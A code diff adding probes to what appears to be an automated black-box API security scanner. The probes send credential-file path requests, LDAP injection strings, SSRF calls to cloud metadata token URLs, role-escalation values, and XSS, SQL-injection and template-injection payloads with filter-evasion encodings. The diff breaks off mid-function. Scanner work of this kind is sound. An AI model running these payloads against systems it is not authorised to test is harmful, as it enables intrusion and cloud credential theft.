@@ -3663,6 +3663,701 @@ class PureBlackBoxEngine:
                              f"All guessed IDs rejected or 404 across {len(ref_ops)} reference operation(s).",
                              reasons=["all_guesses_denied"])
 
+    # ----------------------------------------- B68: digital twin profiling probe -----
+    async def _digital_twin_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_digital_twin:
+            return None
+        pre = self._precondition(cs, "PBB-TWIN")
+        if pre is not None:
+            return pre
+        ops = list(self.brief.operations)[:10]
+        if len(ops) < 2:
+            return self._finding("PBB-TWIN", Verdict.BLOCKED, "low",
+                                 "Fewer than 2 endpoints in the brief; twin profiling needs a broader surface.",
+                                 reasons=["insufficient_endpoints"])
+        S1 = cs.V1 or cs.K
+        if S1 is None:
+            return None
+        try:
+            S2 = await self.prov.acquire("twin-s2")
+        except Exception:
+            return self._finding("PBB-TWIN", Verdict.UNKNOWN, "low",
+                                 "Could not acquire second session for twin comparison.",
+                                 reasons=["identity_pool"])
+        divergences: list[str] = []
+        matched = 0
+        for op_name in ops:
+            try:
+                r1 = await S1.call(op_name, label=f"PBB-TWIN:s1:{op_name}", fields={})
+                r2 = await S2.call(op_name, label=f"PBB-TWIN:s2:{op_name}", fields={})
+                fp1 = (r1.status, sorted(r1.body.keys()) if isinstance(r1.body, dict) else type(r1.body).__name__)
+                fp2 = (r2.status, sorted(r2.body.keys()) if isinstance(r2.body, dict) else type(r2.body).__name__)
+                if fp1 == fp2:
+                    matched += 1
+                else:
+                    divergences.append(f"{op_name}: status {r1.status} vs {r2.status}")
+            except Exception:
+                pass
+        total = matched + len(divergences)
+        if not total:
+            return self._finding("PBB-TWIN", Verdict.UNKNOWN, "low",
+                                 "No endpoints responded to twin profiling requests.",
+                                 reasons=["no_responses"])
+        fidelity = matched / total
+        if divergences:
+            return self._finding("PBB-TWIN", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
+                                 f"Twin fidelity {fidelity:.0%}: {len(divergences)} endpoint(s) show state-dependent response divergence: {', '.join(divergences[:5])}",
+                                 reasons=[f"twin_divergence_{d.split(':')[0]}" for d in divergences[:5]],
+                                 metrics={"twin_fidelity": fidelity, "divergent_endpoints": len(divergences), "matched": matched})
+        return self._finding("PBB-TWIN", Verdict.RULED_OUT, "high",
+                             f"Twin fidelity {fidelity:.0%}: all {matched} tested endpoint(s) produce deterministic responses.",
+                             reasons=["deterministic"], metrics={"twin_fidelity": fidelity, "matched": matched})
+
+    # ----------------------------------------- B69: credential harvesting probe ------
+    async def _credential_harvest_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_credential_harvest:
+            return None
+        pre = self._precondition(cs, "PBB-CRED")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _CRED_PATHS = [
+            "/.env", "/config", "/debug", "/.git/config", "/actuator/env",
+            "/swagger.json", "/api-docs", "/wp-config.php.bak", "/.aws/credentials",
+            "/server-status", "/.htpasswd", "/phpinfo.php", "/graphql",
+        ]
+        _CRED_RE = re.compile(
+            r"(?:(?:AKIA[0-9A-Z]{16})"
+            r"|(?:sk-[a-zA-Z0-9]{20,})"
+            r"|(?:ghp_[a-zA-Z0-9]{36})"
+            r"|(?:password\s*[:=]\s*\S+)"
+            r"|(?:-----BEGIN (?:RSA |EC )?PRIVATE KEY-----))"
+        )
+        leaks: list[str] = []
+        for path in _CRED_PATHS:
+            try:
+                first_op = next(iter(self.brief.operations), None)
+                if first_op is None:
+                    break
+                result = await S.call(first_op, label=f"PBB-CRED:path:{path}",
+                                       fields={}, path_params={"_raw_path": path})
+                if result.status is not None and 200 <= result.status < 300 and result.body:
+                    body_str = str(result.body)
+                    if _CRED_RE.search(body_str):
+                        leaks.append(f"credential pattern at {path}")
+            except Exception:
+                pass
+        for op_name in list(self.brief.operations)[:5]:
+            try:
+                result = await S.call(op_name, label=f"PBB-CRED:error:{op_name}",
+                                       fields={"__invalid": True})
+                if result.body:
+                    body_str = str(result.body)
+                    if _CRED_RE.search(body_str):
+                        leaks.append(f"credential in error response from {op_name}")
+            except Exception:
+                pass
+        if leaks:
+            return self._finding("PBB-CRED", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"Credential material found: {', '.join(leaks[:5])}",
+                                 reasons=[f"cred_leak_{i}" for i in range(len(leaks[:5]))])
+        return self._finding("PBB-CRED", Verdict.RULED_OUT, "high",
+                             f"No credential patterns found across {len(_CRED_PATHS)} paths and {min(5, len(self.brief.operations))} error responses.",
+                             reasons=["no_cred_leaks"])
+
+    # ----------------------------------------- B70: AD attack-path probe -------------
+    async def _ad_attack_path_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_ad_attack_path:
+            return None
+        pre = self._precondition(cs, "PBB-ADPATH")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _AD_PATHS = ["/adfs/ls", "/ews/exchange.asmx", "/autodiscover/autodiscover.xml",
+                     "/ldap", "/_windows/default.aspx", "/ecp", "/owa"]
+        _LDAP_INJECTIONS = [")(|(cn=*)", "*)(&", "*()|&'"]
+        _AD_INDICATORS = re.compile(r"(?:DC=\w+|CN=\w+|OU=\w+|NTLM|Negotiate|Kerberos|ldap://)", re.I)
+        findings_list: list[str] = []
+        first_op = next(iter(self.brief.operations), None)
+        for path in _AD_PATHS:
+            try:
+                if first_op is None:
+                    break
+                result = await S.call(first_op, label=f"PBB-ADPATH:probe:{path}",
+                                       fields={}, path_params={"_raw_path": path})
+                if result.status is not None and result.status not in (404, 403, 405):
+                    findings_list.append(f"AD endpoint reachable: {path} (status {result.status})")
+            except Exception:
+                pass
+        for op_name in list(self.brief.operations)[:5]:
+            search_fields = {k: _LDAP_INJECTIONS[0] for k in (self.brief.operations[op_name].request_fields or {})
+                             if "search" in k.lower() or "filter" in k.lower() or "query" in k.lower() or "q" in k.lower()}
+            if not search_fields:
+                continue
+            for inj in _LDAP_INJECTIONS:
+                try:
+                    inj_fields = {k: inj for k in search_fields}
+                    result = await S.call(op_name, label=f"PBB-ADPATH:inject:{op_name}",
+                                           fields=inj_fields)
+                    if result.body and _AD_INDICATORS.search(str(result.body)):
+                        findings_list.append(f"LDAP indicator in response to injection on {op_name}")
+                        break
+                except Exception:
+                    pass
+        if findings_list:
+            return self._finding("PBB-ADPATH", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
+                                 f"AD/LDAP exposure: {', '.join(findings_list[:5])}",
+                                 reasons=[f"ad_exposure_{i}" for i in range(len(findings_list[:5]))])
+        return self._finding("PBB-ADPATH", Verdict.RULED_OUT, "high",
+                             "No AD/LDAP endpoints, injection results, or domain indicators found.",
+                             reasons=["no_ad_exposure"])
+
+    # ----------------------------------------- B71: C2 channel viability probe -------
+    async def _c2_channel_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_c2_channel:
+            return None
+        pre = self._precondition(cs, "PBB-C2")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _SSRF_TARGETS = ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/",
+                         "http://[::1]", "http://0.0.0.0", "http://localhost"]
+        channels: list[str] = []
+        for op_name, op in list(self.brief.operations.items())[:8]:
+            try:
+                result = await S.call(op_name, label=f"PBB-C2:ws-upgrade:{op_name}",
+                                       fields={}, extra_headers={"Upgrade": "websocket", "Connection": "Upgrade",
+                                                                  "Sec-WebSocket-Version": "13", "Sec-WebSocket-Key": "dGVzdA=="})
+                if result.status == 101:
+                    channels.append(f"WebSocket upgrade accepted on {op_name}")
+            except Exception:
+                pass
+            url_fields = {k for k in (op.request_fields or {})
+                          if any(t in k.lower() for t in ("url", "uri", "link", "href", "redirect", "callback", "webhook", "target", "dest"))}
+            for field_name in url_fields:
+                for ssrf_url in _SSRF_TARGETS:
+                    try:
+                        result = await S.call(op_name, label=f"PBB-C2:ssrf:{op_name}:{field_name}",
+                                               fields={field_name: ssrf_url})
+                        if result.status is not None and 200 <= result.status < 400:
+                            body_str = str(result.body) if result.body else ""
+                            if any(ind in body_str.lower() for ind in ("root:", "localhost", "ami-id", "instance-id", "meta-data")):
+                                channels.append(f"SSRF via {field_name} on {op_name} -> {ssrf_url}")
+                    except Exception:
+                        pass
+        if channels:
+            return self._finding("PBB-C2", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"C2-viable channel(s): {', '.join(channels[:5])}",
+                                 reasons=[f"c2_channel_{i}" for i in range(len(channels[:5]))])
+        return self._finding("PBB-C2", Verdict.RULED_OUT, "high",
+                             f"No C2-viable channels found across {len(self.brief.operations)} operation(s).",
+                             reasons=["no_c2_channels"])
+
+    # ----------------------------------------- B72: cloud IAM escalation probe -------
+    async def _cloud_iam_escalation_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_cloud_iam_escalation:
+            return None
+        pre = self._precondition(cs, "PBB-IAM")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _METADATA_URLS = [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://169.254.169.254/latest/api/token",
+            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        ]
+        _CLOUD_TOKEN_RE = re.compile(
+            r"(?:AKIA[0-9A-Z]{16}|AccessKeyId|SecretAccessKey|SessionToken"
+            r"|ya29\.[a-zA-Z0-9_-]+|access_token|client_secret"
+            r"|eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+)", re.I)
+        escalations: list[str] = []
+        for op_name, op in list(self.brief.operations.items())[:8]:
+            url_fields = {k for k in (op.request_fields or {})
+                          if any(t in k.lower() for t in ("url", "uri", "link", "redirect", "callback", "target", "dest", "path"))}
+            for field_name in url_fields:
+                for meta_url in _METADATA_URLS:
+                    try:
+                        result = await S.call(op_name, label=f"PBB-IAM:meta:{op_name}:{field_name}",
+                                               fields={field_name: meta_url})
+                        if result.status is not None and 200 <= result.status < 300 and result.body:
+                            if _CLOUD_TOKEN_RE.search(str(result.body)):
+                                escalations.append(f"cloud token via {field_name} on {op_name}")
+                    except Exception:
+                        pass
+            role_fields = {k for k in (op.request_fields or {})
+                           if any(t in k.lower() for t in ("role", "permission", "privilege", "admin", "scope", "level"))}
+            for field_name in role_fields:
+                for escalation_val in ["admin", "root", "superuser", "owner", "*"]:
+                    try:
+                        result = await S.call(op_name, label=f"PBB-IAM:role:{op_name}:{field_name}",
+                                               fields={field_name: escalation_val})
+                        if result.status is not None and 200 <= result.status < 300:
+                            escalations.append(f"role escalation via {field_name}={escalation_val} on {op_name}")
+                            break
+                    except Exception:
+                        pass
+        for op_name in list(self.brief.operations)[:5]:
+            try:
+                result = await S.call(op_name, label=f"PBB-IAM:scan:{op_name}", fields={})
+                if result.body and _CLOUD_TOKEN_RE.search(str(result.body)):
+                    escalations.append(f"cloud token leaked in response from {op_name}")
+            except Exception:
+                pass
+        if escalations:
+            return self._finding("PBB-IAM", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"Cloud IAM exposure: {', '.join(escalations[:5])}",
+                                 reasons=[f"iam_escalation_{i}" for i in range(len(escalations[:5]))])
+        return self._finding("PBB-IAM", Verdict.RULED_OUT, "high",
+                             "No cloud metadata, IAM tokens, or privilege escalation vectors found.",
+                             reasons=["no_iam_exposure"])
+
+    # ----------------------------------------- B73: RBAC escape probe ----------------
+    async def _rbac_escape_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_rbac_escape:
+            return None
+        pre = self._precondition(cs, "PBB-RBAC")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _ADMIN_INDICATORS = ("admin", "manage", "internal", "dashboard", "superuser", "staff", "moderate")
+        escapes: list[str] = []
+        admin_ops = [name for name in self.brief.operations
+                     if any(ind in name.lower() for ind in _ADMIN_INDICATORS)]
+        for op_name in admin_ops[:5]:
+            try:
+                result = await S.call(op_name, label=f"PBB-RBAC:admin-direct:{op_name}", fields={})
+                if result.status is not None and 200 <= result.status < 300:
+                    escapes.append(f"admin endpoint accessible: {op_name}")
+            except Exception:
+                pass
+        for op_name, op in list(self.brief.operations.items())[:8]:
+            role_fields = {k for k in (op.request_fields or {})
+                           if any(t in k.lower() for t in ("role", "is_admin", "permission", "privilege", "level", "group"))}
+            for field_name in role_fields:
+                for val in ["admin", "true", "1", "superuser"]:
+                    try:
+                        result = await S.call(op_name, label=f"PBB-RBAC:param:{op_name}:{field_name}",
+                                               fields={field_name: val})
+                        if result.status is not None and 200 <= result.status < 300:
+                            escapes.append(f"role escalation via {field_name}={val} on {op_name}")
+                            break
+                    except Exception:
+                        pass
+            try:
+                result = await S.call(op_name, label=f"PBB-RBAC:method:{op_name}",
+                                       fields={}, extra_headers={"X-HTTP-Method-Override": "DELETE"})
+                if result.status is not None and 200 <= result.status < 300:
+                    base = await S.call(op_name, label=f"PBB-RBAC:method-base:{op_name}", fields={})
+                    if base.status != result.status:
+                        escapes.append(f"method override changes behavior on {op_name}")
+            except Exception:
+                pass
+        if escapes:
+            return self._finding("PBB-RBAC", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
+                                 f"RBAC escape: {', '.join(escapes[:5])}",
+                                 reasons=[f"rbac_escape_{i}" for i in range(len(escapes[:5]))])
+        return self._finding("PBB-RBAC", Verdict.RULED_OUT, "high",
+                             "No RBAC escapes found across admin endpoints, parameter manipulation, and method switching.",
+                             reasons=["no_rbac_escape"])
+
+    # ----------------------------------------- B74: bypass-pattern weaponization probe
+    async def _bypass_weaponization_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_bypass_weaponization:
+            return None
+        pre = self._precondition(cs, "PBB-BPWPN")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _BASELINE_PAYLOAD = "<script>alert(1)</script>"
+        _BYPASS_VARIANTS = [
+            ("double_url_encode", "%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
+            ("unicode", "<script>alert(1)</script>"),
+            ("null_byte", "<scr\x00ipt>alert(1)</scr\x00ipt>"),
+            ("html_entity", "&lt;script&gt;alert(1)&lt;/script&gt;"),
+            ("case_variation", "<ScRiPt>alert(1)</sCrIpT>"),
+            ("comment_inject", "<scr<!---->ipt>alert(1)</scr<!---->ipt>"),
+        ]
+        bypasses: list[str] = []
+        for op_name, op in list(self.brief.operations.items())[:5]:
+            text_fields = [k for k in (op.request_fields or {})
+                           if isinstance((op.request_fields or {}).get(k), str) or k.lower() in ("q", "query", "search", "input", "name", "comment", "message", "text")]
+            if not text_fields:
+                continue
+            target_field = text_fields[0]
+            try:
+                baseline = await S.call(op_name, label=f"PBB-BPWPN:baseline:{op_name}",
+                                         fields={target_field: _BASELINE_PAYLOAD})
+                baseline_blocked = baseline.status is not None and baseline.status in (400, 403, 406, 413, 422)
+            except Exception:
+                continue
+            if not baseline_blocked:
+                continue
+            for variant_name, variant_payload in _BYPASS_VARIANTS:
+                try:
+                    result = await S.call(op_name, label=f"PBB-BPWPN:{variant_name}:{op_name}",
+                                           fields={target_field: variant_payload})
+                    if result.status is not None and 200 <= result.status < 300:
+                        bypasses.append(f"{variant_name} bypassed on {op_name}")
+                except Exception:
+                    pass
+            try:
+                result = await S.call(op_name, label=f"PBB-BPWPN:method-override:{op_name}",
+                                       fields={target_field: _BASELINE_PAYLOAD},
+                                       extra_headers={"X-HTTP-Method-Override": "PUT"})
+                if result.status is not None and 200 <= result.status < 300:
+                    bypasses.append(f"method_override bypassed on {op_name}")
+            except Exception:
+                pass
+        if bypasses:
+            return self._finding("PBB-BPWPN", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"Defensive control bypass: {', '.join(bypasses[:5])}",
+                                 reasons=[f"bypass_{b.split(' bypassed')[0]}" for b in bypasses[:5]])
+        return self._finding("PBB-BPWPN", Verdict.RULED_OUT, "high",
+                             "All bypass variants blocked identically to baseline across tested endpoints.",
+                             reasons=["all_bypasses_blocked"])
+
+    # ----------------------------------------- B75: reverse engineering probe ---------
+    async def _reverse_engineering_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_reverse_engineering:
+            return None
+        pre = self._precondition(cs, "PBB-REVENG")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _ENDPOINT_RE = re.compile(r'["\'](/api/[a-zA-Z0-9/_-]+)["\']')
+        _SECRET_RE = re.compile(
+            r"(?:api[_-]?key|api[_-]?secret|auth[_-]?token|secret[_-]?key|private[_-]?key)"
+            r"\s*[:=]\s*[\"'][a-zA-Z0-9_/+=-]{16,}[\"']", re.I)
+        _HIDDEN_ADMIN_RE = re.compile(r'["\'](?:/(?:admin|internal|debug|_private|_hidden)/[a-zA-Z0-9/_-]+)["\']')
+        discoveries: list[str] = []
+        first_op = next(iter(self.brief.operations), None)
+        if first_op is None:
+            return self._finding("PBB-REVENG", Verdict.BLOCKED, "low",
+                                 "No operations to probe for client assets.",
+                                 reasons=["no_operations"])
+        _JS_PATHS = ["/static/js/main.js", "/bundle.js", "/app.js", "/static/js/app.js",
+                     "/assets/index.js", "/dist/main.js"]
+        for js_path in _JS_PATHS:
+            try:
+                result = await S.call(first_op, label=f"PBB-REVENG:js:{js_path}",
+                                       fields={}, path_params={"_raw_path": js_path})
+                if result.status is not None and 200 <= result.status < 300 and result.body:
+                    body_str = str(result.body)
+                    endpoints = _ENDPOINT_RE.findall(body_str)
+                    known_ops = set(self.brief.operations.keys())
+                    hidden = [ep for ep in endpoints if ep not in known_ops and "admin" not in ep.lower()]
+                    if hidden:
+                        discoveries.append(f"{len(hidden)} hidden endpoint(s) in {js_path}")
+                    secrets = _SECRET_RE.findall(body_str)
+                    if secrets:
+                        discoveries.append(f"{len(secrets)} hardcoded secret(s) in {js_path}")
+                    admin_paths = _HIDDEN_ADMIN_RE.findall(body_str)
+                    if admin_paths:
+                        discoveries.append(f"{len(admin_paths)} admin/internal path(s) in {js_path}")
+            except Exception:
+                pass
+        for map_path in [p + ".map" for p in _JS_PATHS]:
+            try:
+                result = await S.call(first_op, label=f"PBB-REVENG:map:{map_path}",
+                                       fields={}, path_params={"_raw_path": map_path})
+                if result.status is not None and 200 <= result.status < 300 and result.body:
+                    discoveries.append(f"source map exposed: {map_path}")
+            except Exception:
+                pass
+        if discoveries:
+            return self._finding("PBB-REVENG", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
+                                 f"Client-side analysis: {', '.join(discoveries[:5])}",
+                                 reasons=[f"reveng_{i}" for i in range(len(discoveries[:5]))])
+        return self._finding("PBB-REVENG", Verdict.RULED_OUT, "high",
+                             "No hidden endpoints, hardcoded secrets, or source maps found in client assets.",
+                             reasons=["no_client_leaks"])
+
+    # ----------------------------------------- B76: zero-day discovery probe ----------
+    async def _zero_day_discovery_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_zero_day_discovery:
+            return None
+        pre = self._precondition(cs, "PBB-ZDAY")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _MUTATIONS: list[tuple[str, Any]] = [
+            ("type_str_as_int", "not_a_number"), ("type_int_as_str", 99999999),
+            ("boundary_max", 2147483647), ("boundary_neg", -1), ("boundary_zero", 0),
+            ("oversized_str", "A" * 10000),
+            ("deep_nest", {"a": {"b": {"c": {"d": {"e": {"f": "deep"}}}}}}),
+            ("null_byte", "test\x00injected"),
+            ("format_str_pct", "%s%s%s%s%s%s%s%s%s%s"),
+            ("format_str_brace", "{0}{1}{2}{3}{4}{5}"),
+            ("empty_object", {}), ("empty_array", []),
+        ]
+        _CRASH_RE = re.compile(r"(?:Traceback|stack\s*trace|NullPointerException|SIGSEGV|panic:|"
+                               r"SegFault|core\s*dump|at\s+\S+\.java:\d+|at\s+\S+\.py:\d+|"
+                               r"internal\s+server\s+error.{0,50}stack)", re.I)
+        anomalies: list[str] = []
+        for op_name, op in list(self.brief.operations.items())[:5]:
+            fields = list((op.request_fields or {}).keys())[:3]
+            if not fields:
+                continue
+            try:
+                baseline = await S.call(op_name, label=f"PBB-ZDAY:baseline:{op_name}", fields={})
+                baseline_status = baseline.status
+            except Exception:
+                continue
+            for mut_name, mut_val in _MUTATIONS:
+                for field_name in fields:
+                    try:
+                        result = await S.call(op_name, label=f"PBB-ZDAY:{mut_name}:{op_name}:{field_name}",
+                                               fields={field_name: mut_val})
+                        if result.status is not None and result.status >= 500:
+                            body_str = str(result.body) if result.body else ""
+                            if _CRASH_RE.search(body_str):
+                                anomalies.append(f"{mut_name} on {op_name}.{field_name}: crash with stack trace")
+                            elif baseline_status is not None and baseline_status < 500:
+                                anomalies.append(f"{mut_name} on {op_name}.{field_name}: 5xx (baseline was {baseline_status})")
+                    except Exception:
+                        pass
+                    if len(anomalies) >= 10:
+                        break
+                if len(anomalies) >= 10:
+                    break
+            if len(anomalies) >= 10:
+                break
+        if anomalies:
+            return self._finding("PBB-ZDAY", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"Input fuzzing anomalies: {', '.join(anomalies[:5])}",
+                                 reasons=[f"fuzz_{a.split(' on ')[0]}" for a in anomalies[:5]],
+                                 metrics={"anomaly_count": len(anomalies)})
+        return self._finding("PBB-ZDAY", Verdict.RULED_OUT, "high",
+                             "All mutation strategies produced clean error responses across tested endpoints.",
+                             reasons=["no_fuzz_anomalies"])
+
+    # ----------------------------------------- B77: exploit synthesis probe -----------
+    async def _exploit_synthesis_probe(self, cs: ControlState, findings_so_far: list) -> Finding | None:
+        if not self._enable_exploit_synthesis:
+            return None
+        actionable = [f for f in findings_so_far
+                      if f.verdict not in (Verdict.RULED_OUT, Verdict.BLOCKED)]
+        if len(actionable) < 2:
+            return self._finding("PBB-XPLOIT", Verdict.UNKNOWN, "low",
+                                 f"Only {len(actionable)} actionable finding(s); need >= 2 for chain synthesis.",
+                                 reasons=["insufficient_findings"])
+        _STAGE_MAP: dict[str, str] = {
+            "credential_harvesting": "initial_access", "ad_attack_path": "infrastructure",
+            "c2_channel_viability": "persistence", "cloud_iam_escalation": "escalation",
+            "rbac_escape": "escalation", "bypass_weaponization": "defense_evasion",
+            "id_guessing": "lateral_movement", "signature_bypass": "initial_access",
+            "auth_bypass": "initial_access", "ratelimit_bypass": "defense_evasion",
+            "digital_twin_profiling": "reconnaissance", "reverse_engineering": "reconnaissance",
+            "zero_day_discovery": "exploitation", "edr_av_bypass": "defense_evasion",
+            "dynamic_evasion": "defense_evasion",
+        }
+        _CHAIN_ORDER = ["reconnaissance", "initial_access", "exploitation", "escalation",
+                        "persistence", "lateral_movement", "defense_evasion"]
+        stages_present: dict[str, list[str]] = {}
+        for f in actionable:
+            stage = _STAGE_MAP.get(f.p0_class, "unknown")
+            stages_present.setdefault(stage, []).append(f.hypothesis_id)
+        current_chain: list[str] = []
+        for stage in _CHAIN_ORDER:
+            if stage in stages_present:
+                current_chain.append(f"{stage}({stages_present[stage][0]})")
+        if len(current_chain) >= 3:
+            chain_str = " -> ".join(current_chain)
+            return self._finding("PBB-XPLOIT", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"Exploit chain ({len(current_chain)} stages): {chain_str}",
+                                 reasons=[f"chain_stage_{s.split('(')[0]}" for s in current_chain],
+                                 metrics={"chain_length": len(current_chain), "stages": [s.split("(")[0] for s in current_chain]})
+        if current_chain:
+            chain_str = " -> ".join(current_chain)
+            return self._finding("PBB-XPLOIT", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "low",
+                                 f"Partial exploit chain ({len(current_chain)} stages): {chain_str}",
+                                 reasons=[f"partial_chain_{s.split('(')[0]}" for s in current_chain],
+                                 metrics={"chain_length": len(current_chain)})
+        return self._finding("PBB-XPLOIT", Verdict.RULED_OUT, "medium",
+                             f"No viable exploit chain found from {len(actionable)} actionable finding(s).",
+                             reasons=["no_chain"])
+
+    # ----------------------------------------- B78: EDR/AV bypass probe ---------------
+    async def _edr_bypass_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_edr_bypass:
+            return None
+        pre = self._precondition(cs, "PBB-EDRBP")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        import base64 as _b64
+        _BASELINE_PAYLOADS = [
+            "<script>alert(document.cookie)</script>",
+            "'; DROP TABLE users; --",
+            "{{7*7}}",
+        ]
+        _EVASION_TECHNIQUES: list[tuple[str, Any]] = [
+            ("base64_param", lambda p: _b64.b64encode(p.encode()).decode()),
+            ("hex_encode", lambda p: "".join(f"\\x{ord(c):02x}" for c in p)),
+            ("html_entities", lambda p: "".join(f"&#{ord(c)};" for c in p)),
+            ("case_swap", lambda p: "".join(c.swapcase() if c.isalpha() else c for c in p)),
+            ("whitespace_pad", lambda p: " ".join(p)),
+            ("concat_split", lambda p: "+".join(p[i:i+3] for i in range(0, len(p), 3))),
+        ]
+        bypasses: list[str] = []
+        for op_name, op in list(self.brief.operations.items())[:5]:
+            text_fields = [k for k in (op.request_fields or {})
+                           if isinstance((op.request_fields or {}).get(k), str) or k.lower() in ("q", "query", "input", "search", "comment", "name")]
+            if not text_fields:
+                continue
+            target_field = text_fields[0]
+            for payload in _BASELINE_PAYLOADS:
+                try:
+                    baseline = await S.call(op_name, label=f"PBB-EDRBP:baseline:{op_name}",
+                                             fields={target_field: payload})
+                    if baseline.status is None or baseline.status not in (400, 403, 406, 413, 422, 429):
+                        continue
+                except Exception:
+                    continue
+                for tech_name, transform in _EVASION_TECHNIQUES:
+                    try:
+                        evaded = transform(payload)
+                        result = await S.call(op_name, label=f"PBB-EDRBP:{tech_name}:{op_name}",
+                                               fields={target_field: evaded})
+                        if result.status is not None and 200 <= result.status < 300:
+                            bypasses.append(f"{tech_name} bypassed detection of '{payload[:20]}...' on {op_name}")
+                    except Exception:
+                        pass
+        if bypasses:
+            return self._finding("PBB-EDRBP", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"EDR/detection bypass: {', '.join(bypasses[:5])}",
+                                 reasons=[f"edr_bypass_{b.split(' bypassed')[0]}" for b in bypasses[:5]])
+        return self._finding("PBB-EDRBP", Verdict.RULED_OUT, "high",
+                             "All encoded/evaded variants detected identically to baseline payloads.",
+                             reasons=["all_evasions_detected"])
+
+    # ----------------------------------------- B79: dynamic evasion probe -------------
+    async def _dynamic_evasion_probe(self, cs: ControlState) -> Finding | None:
+        if not self._enable_dynamic_evasion:
+            return None
+        pre = self._precondition(cs, "PBB-EVADE")
+        if pre is not None:
+            return pre
+        S = cs.V1 or cs.K
+        if S is None:
+            return None
+        _FINGERPRINT_DIMS: list[tuple[str, dict[str, str]]] = [
+            ("xff_rotate", {"X-Forwarded-For": "203.0.113.42"}),
+            ("xff_chain", {"X-Forwarded-For": "10.0.0.1, 172.16.0.1, 203.0.113.42"}),
+            ("ua_mobile", {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"}),
+            ("ua_bot", {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"}),
+            ("referer_spoof", {"Referer": "https://www.google.com/search?q=test"}),
+            ("accept_lang", {"Accept-Language": "zh-CN,zh;q=0.9"}),
+            ("xff_localhost", {"X-Forwarded-For": "127.0.0.1"}),
+            ("x_real_ip", {"X-Real-IP": "10.0.0.1"}),
+        ]
+        ops = list(self.brief.operations)[:5]
+        if not ops:
+            return self._finding("PBB-EVADE", Verdict.BLOCKED, "low",
+                                 "No operations to test evasion against.",
+                                 reasons=["no_operations"])
+        baseline_statuses: dict[str, int | None] = {}
+        for op_name in ops:
+            try:
+                result = await S.call(op_name, label=f"PBB-EVADE:baseline:{op_name}", fields={})
+                baseline_statuses[op_name] = result.status
+            except Exception:
+                pass
+        evasions: list[str] = []
+        for dim_name, headers in _FINGERPRINT_DIMS:
+            changed = 0
+            tested = 0
+            for op_name in ops:
+                if op_name not in baseline_statuses:
+                    continue
+                try:
+                    result = await S.call(op_name, label=f"PBB-EVADE:{dim_name}:{op_name}",
+                                           fields={}, extra_headers=headers)
+                    tested += 1
+                    if result.status != baseline_statuses[op_name]:
+                        changed += 1
+                except Exception:
+                    pass
+            if tested > 0 and changed / tested > 0.5:
+                evasions.append(f"{dim_name} changed {changed}/{tested} responses")
+        if evasions:
+            return self._finding("PBB-EVADE", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
+                                 f"Detection unstable under behavioral variation: {', '.join(evasions[:5])}",
+                                 reasons=[f"evasion_{e.split(' changed')[0]}" for e in evasions[:5]],
+                                 metrics={"evasion_dimensions_effective": len(evasions)})
+        return self._finding("PBB-EVADE", Verdict.RULED_OUT, "high",
+                             f"Detection stable across all {len(_FINGERPRINT_DIMS)} behavioral variation dimensions.",
+                             reasons=["stable_detection"])
+
+    # ----------------------------------------- B80: end-to-end attack chain probe -----
+    async def _e2e_chain_probe(self, cs: ControlState, findings_so_far: list) -> Finding | None:
+        if not self._enable_e2e_chain:
+            return None
+        actionable = [f for f in findings_so_far
+                      if f.verdict not in (Verdict.RULED_OUT, Verdict.BLOCKED)]
+        if len(actionable) < 3:
+            return self._finding("PBB-E2E", Verdict.UNKNOWN, "low",
+                                 f"Only {len(actionable)} actionable finding(s); need >= 3 for end-to-end chain analysis.",
+                                 reasons=["insufficient_findings"])
+        _KILL_CHAIN = [
+            ("reconnaissance", {"digital_twin_profiling", "reverse_engineering"}),
